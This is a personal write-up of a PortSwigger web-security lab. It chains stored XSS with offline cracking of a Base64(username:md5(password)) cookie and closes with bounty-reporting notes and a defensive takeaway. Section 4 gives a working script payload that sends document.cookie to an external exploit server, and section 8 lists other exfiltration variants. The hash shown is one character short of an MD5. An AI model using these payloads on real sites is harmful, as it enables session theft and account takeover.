# LAB: Offline password cracking

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Authentication (Other mechanisms)                                                                                             |
| **Difficulty**              | Practitioner                                                                                                                 |
| **Date**                    | 2026-11-20                                                                                                                   |
| **Time**                    |                                                                                                                                 |
| **Solved without solution** | yes                                                                                                                                 |
| **Link**                    | [lab-offline-password-cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking) |

## 1. Objective

Exfiltrate an authentication cookie containing a weak password hash via an XSS vulnerability, crack the hash offline, and use the recovered plaintext credentials to log in as the target user (`carlos`) to delete their account.

## 2. Surface

- Blog comment submission form vulnerable to Stored Cross-Site Scripting (XSS).
- Persistent `stay-logged-in` cookie issued by the application.
- Primary login endpoint (`/login`) and target user profile page (`/my-account`).

## 3. Hypothesis

If the application stores persistent authentication tokens using predictable hashes of user credentials and is vulnerable to Stored XSS, an attacker can execute malicious JavaScript in a victim's browser context to exfiltrate their `stay-logged-in` cookie, crack the password hash offline, and obtain the victim's plaintext credentials.

## 4. Payload that worked

Stored XSS Payload (Comment Section):
`<script>fetch('https://xxxx.exploit-server.net/log?cookie=' + document.cookie)</script>`

Exfiltrated Cookie Structure:
`stay-logged-in=Y2FybG9zOmQxODUzODIwODk3YTgxZTgzNWNiZTU2NWVmNTA2YWIz`

Base64 Decoded Value:
`carlos:d1853820897a81e835cbe56ef506ab3`

Offline Hash Identification:
`d1853820897a81e835cbe56ef506ab3` -> MD5 hash of `onceuponatime`

Recovered Credentials:
`carlos:onceuponatime`

## 5. Why it works

The vulnerability stems from two combined weaknesses: Stored Cross-Site Scripting (XSS) in the blog's comment feature and an insecure persistent session token structure (`Base64(username:md5(password))`). When a victim or administrator views a comment containing the XSS payload, the script executes automatically within their browser context. By capturing `document.cookie` via an HTTP request to an attacker-controlled endpoint (the exploit server logs), the attacker exfiltrates the raw `stay-logged-in` cookie. Because the cookie value is a deterministic, un-salted Base64-encoded MD5 hash of the plaintext password, decoding the string and reversing the MD5 hash via a dictionary lookup reveals the victim's underlying credentials.

## 6. What I tried that failed

- Attempted to reuse the pre-computed cookie brute-force wordlist from the previous lab directly against `/my-account`, which failed because the target user (`carlos`) used a different, non-standard password not covered by the initial small dictionary attempt.
- Tested basic script execution using standard alert payloads (`<script>alert('alert')</script>`) to confirm the Stored XSS injection point in the comment submission field before crafting the exfiltration script.
- Attempted initial cookie exfiltration without forcing client redirection, which required setting up a dynamic navigation payload (`document.location`) pointing to the external logging server to ensure the full `document.cookie` string was captured in the server access logs.
- Rule extracted: When direct offline cookie brute-forcing fails due to unknown password complexity, look for client-side injection vulnerabilities (XSS) to exfiltrate active session tokens or persistent credentials directly from valid users.

## 7. In a real target (bounty translation)

- Where it shows up: Web applications combining XSS vulnerabilities with poorly protected session storage or weak hashing schemes for persistent cookies (e.g., `Base64(username:md5(password))`).
- Quick detection: Inspect cookie security flags (`HttpOnly`). If `stay-logged-in` or session cookies lack `HttpOnly`, test for XSS sinks to confirm if client-side scripts can read sensitive token data.
- Impact: Full account compromise and permanent credential exposure through offline hash cracking, even if direct network-based brute-force protections exist on `/login`.
- In the report: Demonstrate the Stored XSS payload capturing the cookie, show the Base64 decoding breakdown identifying the MD5 hash, and document successful authentication using the cracked plaintext password.

## 8. Bypass / variants noticed

- Using alternative client-side exfiltration techniques such as `fetch()`, `XMLHttpRequest`, or `new Image().src` pointed to an external collaborator or logging listener to exfiltrate sensitive cookies without relying on visible page redirection.
- Extracting persistent credentials from `document.cookie` to crack password hashes offline, bypassing server-side authentication mechanisms and rate-limiting controls entirely.

## 9. Takeaway

Persistent session cookies must always set the `HttpOnly` flag to prevent script-based exfiltration via XSS. Furthermore, authentication tokens must never contain hashes of user passwords; they should consist of cryptographically secure, high-entropy random identifiers stored server-side.
